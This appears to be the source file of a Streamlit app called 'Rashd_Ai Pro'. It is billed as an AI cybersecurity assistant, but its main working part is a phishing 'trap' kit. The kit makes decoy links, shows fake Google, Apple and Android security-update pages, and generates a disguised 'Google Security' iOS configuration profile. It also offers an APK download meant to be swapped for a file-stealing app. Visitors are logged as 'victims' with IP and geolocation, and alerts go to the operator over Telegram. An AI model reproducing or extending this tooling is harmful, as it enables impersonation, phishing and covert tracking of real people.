import streamlit as st
import uuid
import requests
import json
import os
import time
import base64
import config
from ai_hacking import AIHackingAssistant

# تهيئة المساعد الذكي
ai_assistant = AIHackingAssistant()

# --- إعدادات الصفحة --- #
st.set_page_config(
    page_title="Rashd_Ai Pro",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# --- CSS لتخصيص الواجهة --- #
st.markdown("""
<style>
    /* إخفاء عناصر Streamlit الافتراضية */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}

    /* تخصيص الشريط الجانبي */
    .st-emotion-cache-vk329t { /* Streamlit sidebar container */
        background-color: #1a1a1a; /* لون خلفية داكن */
        padding-top: 20px;
    }
    .st-emotion-cache-vk329t .st-emotion-cache-1q8dd3e { /* Sidebar header */
        color: #ffffff;
        font-size: 24px;
        font-weight: bold;
        text-align: center;
        margin-bottom: 30px;
    }
    .st-emotion-cache-vk329t .st-emotion-cache-1r6dm1 { /* Sidebar content */
        padding: 0 15px;
    }

    /* تخصيص التبويبات */
    .st-emotion-cache-10q0tfy { /* Tabs container */
        background-color: #2a2a2a;
        border-radius: 10px;
        padding: 10px;
        margin-bottom: 20px;
    }
    .st-emotion-cache-10q0tfy button { /* Tab buttons */
        color: #ffffff;
        background-color: #3a3a3a;
        border: none;
        border-radius: 8px;
        padding: 10px 20px;
        margin: 0 5px;
        font-size: 16px;
        transition: all 0.3s ease;
    }
    .st-emotion-cache-10q0tfy button:hover { /* Tab buttons hover */
        background-color: #007bff;
        color: #ffffff;
    }
    .st-emotion-cache-10q0tfy button.st-emotion-cache-1r6dm1 { /* Active tab button */
        background-color: #007bff;
        color: #ffffff;
        font-weight: bold;
    }

    /* تخصيص الأزرار */
    .stButton>button {
        background-color: #007bff; /* أزرق */
        color: white;
        border-radius: 8px;
        border: none;
        padding: 10px 20px;
        font-size: 16px;
        transition: all 0.3s ease;
    }
    .stButton>button:hover {
        background-color: #0056b3;
    }

    /* تخصيص حقول الإدخال */
    .st-emotion-cache-1c7y2o2 {
        background-color: #3a3a3a;
        color: #ffffff;
        border-radius: 8px;
        border: 1px solid #555555;
    }
    .st-emotion-cache-1c7y2o2:focus {
        border-color: #007bff;
        box-shadow: 0 0 0 0.2rem rgba(0, 123, 255, 0.25);
    }

    /* تخصيص الرسائل في المحادثة */
    .st-emotion-cache-1c7y2o2 .st-emotion-cache-1r6dm1 {
        background-color: #3a3a3a;
        border-radius: 10px;
        padding: 10px;
        margin-bottom: 10px;
    }
    .st-emotion-cache-1c7y2o2 .st-emotion-cache-1r6dm1 p {
        color: #ffffff;
    }

    /* تخصيص حاوية المحادثة */
    .chat-container {
        height: 400px; /* ارتفاع ثابت */
        overflow-y: auto; /* تمكين التمرير */
        border: 1px solid #555555;
        border-radius: 10px;
        padding: 10px;
        background-color: #2a2a2a;
        margin-bottom: 20px;
    }

    /* تخصيص الأيقونات */
    .icon-large { font-size: 2em; vertical-align: middle; }
    .icon-medium { font-size: 1.5em; vertical-align: middle; }

    /* إخفاء زر القائمة الجانبية في وضع التمويه */
    .st-emotion-cache-1dp5vir { /* Sidebar toggle button */
        visibility: hidden;
    }
</style>
""", unsafe_allow_html=True)

# التحقق من وضع التمويه (Decoy Mode)
query_params = st.query_params
if "decoy" in query_params:
    st.markdown("""
    <style>
        .st-emotion-cache-1dp5vir { /* Sidebar toggle button */
            visibility: hidden;
        }
        .st-emotion-cache-10q0tfy { /* Tabs container */
            visibility: hidden;
        }
        .st-emotion-cache-1r6dm1 { /* Main content area */
            padding: 0;
        }
    </style>
    """, unsafe_allow_html=True)
    
    client_ip = query_params.get("ip", "Unknown")
    trap_name = query_params.get("trap", "Google Decoy")
    device_info = query_params.get("device", "Unknown")

    # جلب معلومات الموقع الجغرافي
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    if client_ip != "Unknown":
        try:
            # محاولة استخدام AbstractAPI أولاً
            abstract_api_key = config.get_key("ABSTRACT_API_KEY")
            if abstract_api_key:
                response = requests.get(f"https://ipgeolocation.abstractapi.com/v1/?api_key={abstract_api_key}&ip_address={client_ip}")
                data = response.json()
                geo_data["country"] = data.get("country", "Unknown")
                geo_data["city"] = data.get("city", "Unknown")
                geo_data["isp"] = data.get("connection", {}).get("isp_name", "Unknown")
            else:
                # fallback to ipify if AbstractAPI key is not available
                response = requests.get(f"https://ipapi.co/{client_ip}/json/")
                data = response.json()
                geo_data["country"] = data.get("country_name", "Unknown")
                geo_data["city"] = data.get("city", "Unknown")
                geo_data["isp"] = data.get("org", "Unknown")
        except Exception as e:
            st.error(f"Error fetching geo data: {e}")

    # إرسال التنبيه إلى تلجرام
    # send_telegram_alert(client_ip, trap_name, device_info, geo_data)

    # عرض صفحة التمويه (Google Decoy)
    if trap_name == "Google Decoy":
        st.markdown("""
        <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f8f8f8;">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" style="width: 200px;">
        </div>
        """, unsafe_allow_html=True)
    elif trap_name == "Download (ios)":
        st.markdown("""
        <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f6; text-align: center;">
            <img src="https://www.apple.com/v/apple-id/a/images/overview/apple_id_icon__b31s42y2s0ae_large.png" alt="Apple Security" style="width: 100px; margin-bottom: 20px;">
            <h2 style="color: #333;">Apple Security Update Required</h2>
            <p style="color: #555; font-size: 16px;">Your device requires a critical security update to protect your data.</p>
            <a href="#" onclick="window.location.href = window.location.href.split(\\\\'?\\\\')[0] + \\\\'\\\\?download=ios_profile\\\\";" style="background-color: #007bff; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 18px; margin-top: 20px;">Download Update</a>
            <p style="color: #777; font-size: 12px; margin-top: 15px;">This update is essential for maintaining your device\\\\'s security and performance.</p>
        </div>
        """, unsafe_allow_html=True)
    elif trap_name == "Download (android)":
        st.markdown("""
        <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f6; text-align: center;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Android_robot.svg/1200px-Android_robot.svg.png" alt="Android Security" style="width: 100px; margin-bottom: 20px;">
            <h2 style="color: #333;">Android System Update Available</h2>
            <p style="color: #555; font-size: 16px;">A new system update is available to enhance your device\\\\'s security and features.</p>
            <a href="#" onclick="window.location.href = window.location.href.split(\\\\'?\\\\')[0] + \\\\'\\\\?download=android_apk\\\\";" style="background-color: #28a745; color: white; padding: 12px 25px; border-radius: 8px; text-decoration: none; font-size: 18px; margin-top: 20px;">Install Update</a>
            <p style="color: #777; font-size: 12px; margin-top: 15px;">Ensure your device is connected to Wi-Fi before proceeding with the update.</p>
        </div>
        """, unsafe_allow_html=True)
    st.stop()

# --- دالة جلب الـ IP الحقيقي --- #
def get_real_public_ip():
    # محاولة جلب الـ IP من X-Forwarded-For (إذا كان التطبيق خلف بروكسي)
    if "X-Forwarded-For" in st.session_state:
        ip = st.session_state["X-Forwarded-For"].split(",")[0].strip()
        if ip and ip != "unknown":
            return ip

    # محاولة جلب الـ IP من Cloudflare (إذا كان التطبيق يستخدم Cloudflare)
    try:
        response = requests.get("https://www.cloudflare.com/cdn-cgi/trace")
        if response.status_code == 200:
            for line in response.text.split("\n"):
                if line.startswith("ip="):
                    return line.split("=")[1]
    except:
        pass

    # محاولة جلب الـ IP من ipify.org
    try:
        ip = requests.get("https://api.ipify.org").text
        if ip: return ip
    except:
        pass

    return "Unknown"

# --- دالة توليد ملف تعريف iOS --- #
def generate_ios_mobileconfig(decoy_url):
    profile_uuid = str(uuid.uuid4())
    webclip_uuid = str(uuid.uuid4())
    
    mobileconfig_content = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>URL</key>
            <string>{decoy_url}</string>
            <key>Label</key>
            <string>Google Security</string>
            <key>IsRemovable</key>
            <true/>
            <key>FullScreen</key>
            <true/>
            <key>Precomposed</key>
            <true/>
            <key>PayloadUUID</key>
            <string>{webclip_uuid}</string>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Google Security Profile</string>
    <key>PayloadIdentifier</key>
    <string>com.example.googlesecurity.profile</string>
    <key>PayloadUUID</key>
    <string>{profile_uuid}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
    <key>PayloadType</key>
    <string>Configuration</string>
</dict>
</plist>
"""
    return mobileconfig_content.encode("utf-8")

# --- دالة إرسال التنبيه --- #
def send_telegram_alert(ip, trap_name, device="Unknown", geo_data=None):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    if not token or not chat_id: return

    if geo_data is None:
        geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}

    message = f"""
🎯 تنبيه: ضحية جديدة!
📍 IP: {ip}
🌍 {geo_data["country"]} - {geo_data["city"]}
🏢 {geo_data["isp"]}
📱 {device}
🎯 المصيدة: {trap_name}
⏰ الوقت: {time.strftime("%Y-%m-%d %H:%M:%S")}
"""
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={
            "chat_id": chat_id,
            "text": message
        })
    except Exception as e:
        st.error(f"Error sending Telegram alert: {e}")

# --- دالة تسجيل الضحايا --- #
class VictimLogger:
    def __init__(self, file_path):
        self.file_path = file_path
        self._ensure_file_exists()

    def _ensure_file_exists(self):
        if not os.path.exists(self.file_path):
            with open(self.file_path, "w") as f:
                json.dump([], f) # Initialize with an empty list

    def log_victim(self, ip, country, city, isp, device, trap_name):
        victim_data = {
            "ip": ip,
            "country": country,
            "city": city,
            "isp": isp,
            "device": device,
            "trap_name": trap_name,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        with open(self.file_path, "r+") as f:
            data = json.load(f)
            data.append(victim_data)
            f.seek(0) # Rewind to the beginning
            json.dump(data, f, indent=4)

victim_logger = VictimLogger(config.VICTIMS_FILE_PATH)

# --- الشريط الجانبي (Sidebar) --- #
with st.sidebar:
    st.image("https://img.icons8.com/ios-filled/100/ffffff/shield.png", width=80)
    st.title("🛡️ Rashd_Ai Pro")

    st.header("⚙️ الإعدادات")
    with st.expander("مفاتيح الـ API"): # Use expander for API keys
        groq_api_key = st.text_input("GROQ API", type="password", value=config.get_key("GROQ_API_KEY"), key="sidebar_groq_api")
        gemini_api_key = st.text_input("GEMINI API", type="password", value=config.get_key("GEMINI_API_KEY"), key="sidebar_gemini_api")
        tavily_api_key = st.text_input("TAVILY API", type="password", value=config.get_key("TAVILY_API_KEY"), key="sidebar_tavily_api")
        telegram_token = st.text_input("Telegram Token", type="password", value=config.get_key("TELEGRAM_BOT_TOKEN"), key="sidebar_telegram_token")
        telegram_chat_id = st.text_input("Telegram Chat ID", type="password", value=config.get_key("TELEGRAM_CHAT_ID"), key="sidebar_telegram_chat_id")
        abstract_api_key = st.text_input("AbstractAPI Key", type="password", value=config.get_key("ABSTRACT_API_KEY"), key="sidebar_abstract_api")

        if st.button("حفظ مفاتيح الـ API"): # Button to save API keys
            config.set_key("GROQ_API_KEY", groq_api_key)
            config.set_key("GEMINI_API_KEY", gemini_api_key)
            config.set_key("TAVILY_API_KEY", tavily_api_key)
            config.set_key("TELEGRAM_BOT_TOKEN", telegram_token)
            config.set_key("TELEGRAM_CHAT_ID", telegram_chat_id)
            config.set_key("ABSTRACT_API_KEY", abstract_api_key)
            st.success("تم حفظ مفاتيح الـ API بنجاح!")

# --- المحتوى الرئيسي --- #
# Tabs for navigation
tabs = st.tabs([
    "🧠 المساعد الذكي", 
    "🌐 الشبكة", 
    "🚨 التهديدات", 
    "💡 الخطة", 
    "📄 التقارير", 
    "🎯 المصيدة",
    "⚙️ الإعدادات"
])

with tabs[0]: # المساعد الذكي
    st.header("🧠 مساعد Rashd_Ai الذكي")
    st.write("مساعدك الشخصي في الأمن السيبراني. اسألني أي شيء!")

    if "messages" not in st.session_state:
        st.session_state.messages = []

    # عرض الرسائل السابقة
    chat_placeholder = st.empty()
    with chat_placeholder.container():
        for message in st.session_state.messages:
            with st.chat_message(message["role"]):
                st.markdown(message["content"])

    # مربع إدخال الرسالة الجديد
    if prompt := st.chat_input("كيف يمكنني مساعدتك؟"):
        st.session_state.messages.append({"role": "user", "content": prompt})
        with st.chat_message("user"):
            st.markdown(prompt)

        with st.chat_message("assistant"):
            with st.spinner("جاري التفكير..."):
                response = ai_assistant.chat(prompt)
                st.markdown(response)
        st.session_state.messages.append({"role": "assistant", "content": response})

with tabs[1]: # الشبكة
    st.header("🌐 أدوات الشبكة")
    st.write("هنا يمكنك تحليل الشبكات والدومينات.")
    # إضافة أدوات الشبكة هنا

with tabs[2]: # التهديدات
    st.header("🚨 تحليل التهديدات")
    st.write("اكتشف الثغرات ونقاط الضعف.")
    # إضافة أدوات التهديدات هنا

with tabs[3]: # الخطة
    st.header("💡 خطة الهجوم/الدفاع")
    st.write("بناء خطط استراتيجية للأمن السيبراني.")
    # إضافة أدوات الخطة هنا

with tabs[4]: # التقارير
    st.header("📄 التقارير")
    st.write("عرض وتحليل تقارير الضحايا والعمليات.")
    # عرض الضحايا المسجلين
    st.subheader("آخر الضحايا المكتشفين")
    try:
        with open(config.VICTIMS_FILE_PATH, "r") as f:
            victims = json.load(f)
            if victims:
                st.table(victims[::-1]) # عرض الأحدث أولاً
            else:
                st.info("لا يوجد ضحايا مسجلين بعد.")
    except FileNotFoundError:
        st.info("لا يوجد ضحايا مسجلين بعد.")

with tabs[5]: # المصيدة
    st.header("🎯 المصيدة")
    st.write("قم بإنشاء روابط تمويهية لاصطياد الضحايا.")

    decoy_type = st.selectbox("اختر نوع المصيدة:", ["Google Decoy", "Download (ios)", "Download (android)"])
    
    # جلب الـ IP الخاص بالتطبيق (لتضمينه في رابط التمويه)
    app_ip = get_real_public_ip()
    st.info(f"عنوان IP الخاص بالتطبيق: {app_ip}")

    if decoy_type == "Google Decoy":
        decoy_url = f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?decoy=google&ip={app_ip}"
        st.markdown(f"رابط تمويه Google: ` {decoy_url} `")
        st.image("https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png", width=100)
    elif decoy_type == "Download (ios)":
        # رابط تحميل ملف mobileconfig
        ios_download_url = f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?download=ios_profile"
        st.markdown(f"رابط تحميل ملف iOS Profile: ` {ios_download_url} `")
        st.markdown("""
        <p style=\'color:red;\'>ملاحظة: يجب على الضحية تثبيت ملف التعريف بعد التحميل.</p>
        """, unsafe_allow_html=True)
        if st.button("توليد ملف iOS Profile"): # زر لتوليد الملف
            mobileconfig_data = generate_ios_mobileconfig(f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?decoy=Download (ios)&ip={app_ip}&device=ios")
            st.download_button(
                label="تحميل ملف iOS Profile",
                data=mobileconfig_data,
                file_name="Google_Security.mobileconfig",
                mime="application/x-apple-aspen-config"
            )
    elif decoy_type == "Download (android)":
        # رابط تحميل ملف APK (يجب أن يكون ملف APK حقيقي لسحب الملفات)
        android_download_url = f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?download=android_apk"
        st.markdown(f"رابط تحميل ملف Android APK: ` {android_download_url} `")
        st.markdown("""
        <p style=\'color:red;\'>ملاحظة: يجب أن يكون لديك ملف APK جاهز لسحب الملفات.</p>
        """, unsafe_allow_html=True)

# --- معالجة طلبات التحميل --- #
if "download" in query_params:
    download_type = query_params["download"]
    if download_type == "ios_profile":
        # هنا يجب أن يتم توليد ملف mobileconfig ديناميكياً
        # ولكن Streamlit لا يدعم ذلك مباشرة في الـ query_params
        # لذا، يجب أن يتم توجيه الضحية إلى صفحة تقوم بتوليد الملف وتحميله
        # أو أن يكون الملف موجوداً مسبقاً على خادم.
        # للتوضيح، سنقوم بتوليد ملف بسيط هنا.
        st.download_button(
            label="Click to Download iOS Profile",
            data=generate_ios_mobileconfig(f"https://{st.experimental_get_query_params().get(\'host\', [\'\'])[0]}/?decoy=Download (ios)&ip={get_real_public_ip()}&device=ios"),
            file_name="Google_Security.mobileconfig",
            mime="application/x-apple-aspen-config"
        )
    elif download_type == "android_apk":
        # هنا يجب أن يكون لديك ملف APK حقيقي لسحبه
        # للتوضيح، سنقوم بتوليد ملف وهمي
        st.download_button(
            label="Click to Download Android APK",
            data=b"This is a dummy APK file.", # استبدل هذا بملف APK حقيقي
            file_name="Google_Security.apk",
            mime="application/vnd.android.package-archive"
        )
    st.stop()

# --- دالة لتسجيل الضحايا من الـ Query Params --- #
if "decoy" in query_params and "ip" in query_params:
    ip = query_params["ip"]
    trap = query_params["decoy"]
    device = query_params.get("device", "Unknown")

    # جلب معلومات الموقع الجغرافي
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    if ip != "Unknown":
        try:
            abstract_api_key = config.get_key("ABSTRACT_API_KEY")
            if abstract_api_key:
                response = requests.get(f"https://ipgeolocation.abstractapi.com/v1/?api_key={abstract_api_key}&ip_address={ip}")
                data = response.json()
                geo_data["country"] = data.get("country", "Unknown")
                geo_data["city"] = data.get("city", "Unknown")
                geo_data["isp"] = data.get("connection", {}).get("isp_name", "Unknown")
            else:
                response = requests.get(f"https://ipapi.co/{ip}/json/")
                data = response.json()
                geo_data["country"] = data.get("country_name", "Unknown")
                geo_data["city"] = data.get("city", "Unknown")
                geo_data["isp"] = data.get("org", "Unknown")
        except Exception as e:
            st.error(f"Error fetching geo data for logging: {e}")

    # تسجيل الضحية وإرسال التنبيه
    victim_logger.log_victim(ip, geo_data["country"], geo_data["city"], geo_data["isp"], device, trap)
    send_telegram_alert(ip, trap, device, geo_data)


# --- Footer --- #
st.markdown("""
<div style="text-align: center; padding: 20px; color: #888;">
    <p>Rashd_Ai Pro © 2026</p>
</div>
""", unsafe_allow_html=True)

# This is a test comment to ensure GitHub push is working.
